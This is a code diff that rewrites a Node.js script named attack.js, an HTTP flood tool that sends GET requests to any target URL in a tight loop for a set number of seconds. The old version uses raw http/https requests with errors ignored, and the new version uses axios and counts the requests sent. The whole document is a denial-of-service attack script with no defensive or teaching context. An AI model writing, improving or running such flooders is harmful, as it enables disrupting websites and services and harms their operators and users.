@@ -1,42 +1,35 @@
-const http = require('http');
-const https = require('https');
-const { URL } = require('url');
+const axios = require('axios');
 
-const [,, target, duration] = process.argv;
+// Command-line args
+const [,, target, time] = process.argv;
 
-if (!target || !duration) {
-  console.log('Usage: node attack.js <url> <seconds>');
+if (!target || !time || isNaN(time)) {
+  console.error('USAGE: node attack.js <target> <time_in_seconds>');
   process.exit(1);
 }
 
-const url = new URL(target);
-const endTime = Date.now() + parseInt(duration) * 1000;
-const isHttps = url.protocol === 'https:';
-const client = isHttps ? https : http;
+const duration = parseInt(time) * 1000; // Convert to milliseconds
+const startTime = Date.now();
+let requestsSent = 0;
+let errors = 0;
 
-function flood() {
-  while (Date.now() < endTime) {
-    const options = {
-      hostname: url.hostname,
-      port: url.port || (isHttps ? 443 : 80),
-      path: url.pathname + url.search,
-      method: 'GET',
-      headers: {
-        'User-Agent': 'Mozilla/5.0',
-        'Accept': '*/*',
-        'Connection': 'keep-alive',
-      }
-    };
-
-    const req = client.request(options, res => {
-      res.on('data', () => {}); // Keep connection open
-    });
-
-    req.on('error', () => {}); // Ignore errors
-    req.end();
+const attack = async () => {
+  while (Date.now() - startTime < duration) {
+    axios.get(target)
+      .then(() => {
+        requestsSent++;
+      })
+      .catch(() => {
+        errors++;
+      });
   }
 
-  console.log('Flood ended.');
-}
+  // Wait a moment to let remaining promises resolve
+  setTimeout(() => {
+    console.log(`Attack complete.`);
+    console.log(`Total requests sent: ${requestsSent}`);
+    console.log(`Total errors: ${errors}`);
+  }, 2000);
+};
 
-flood();
+attack();
